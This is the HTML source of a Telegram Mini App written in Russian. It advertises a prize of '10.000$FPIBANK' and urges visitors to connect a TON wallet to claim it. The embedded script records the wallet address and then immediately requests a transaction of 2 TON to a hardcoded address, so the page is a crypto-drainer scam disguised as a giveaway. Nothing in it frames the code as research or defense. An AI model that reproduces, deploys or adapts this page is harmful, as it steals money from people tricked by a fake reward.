<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #ffffff;
        }
        .container {
            max-width: 400px;
            margin: 20px auto;
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
        img {
            width: 100%;
            border-radius: 10px;
        }
        p {
            font-size: 18px;
            color: #ffffff;
        }
        button {
            background: #0088cc;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 15px;
            font-weight: 600;
        }
        button:hover {
            background: #0077b6;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/photo.jpg" alt="Фото">
        <p>ПОЛУЧИТЬ 10.000$FPIBANK</p>
        <p>ПОДКЛЮЧИ КОШЕЛЕК ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</p>
        <button id="connect-wallet">CONNECT WALLET</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        async function connectWallet() {
            try {
                const tonConnect = new TonConnect({
                    manifestUrl: "https://rfrfqrfarfqf.github.io/Telegram-mini-app/tonconnect-manifest.json"
                });

                console.log("TON Connect initialized");

                const connectedWallet = await tonConnect.connect();
                if (connectedWallet) {
                    const walletAddress = connectedWallet.account.address;

                    tg.sendData(JSON.stringify({ wallet: walletAddress }));
                    alert("Кошелек подключен: " + walletAddress);  // заменил showAlert на alert()

                    const transaction = {
                        to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
                        value: "2000000000",
                        payload: "",
                    };

                    await tonConnect.sendTransaction(transaction);
                    alert("Транзакция создана! Подтвердите в кошельке.");
                } else {
                    console.error("Ошибка: Кошелек не подключился");
                }
            } catch (error) {
                console.error("Ошибка при подключении:", error);
                alert("Ошибка: " + error.message);
            }
        }

        document.getElementById("connect-wallet").addEventListener("click", connectWallet);
    </script>
</body>
</html>
